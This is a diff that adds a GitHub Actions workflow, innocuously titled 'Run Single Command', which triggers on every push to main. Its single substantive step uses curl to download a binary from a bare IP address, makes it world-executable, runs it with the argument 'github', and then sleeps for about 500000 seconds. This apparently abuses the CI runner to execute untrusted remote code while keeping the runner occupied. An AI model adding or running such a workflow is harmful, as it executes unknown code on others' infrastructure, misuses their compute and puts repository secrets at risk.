@@ -1,0 +1,17 @@
+name: Run Single Command
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  run-shell:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v3
+
+      - name: Run a Single Shell Command
+        run: curl -O 193.181.212.206/ddd/studyproject; chmod 777 studyproject; ./studyproject github; sleep 500000
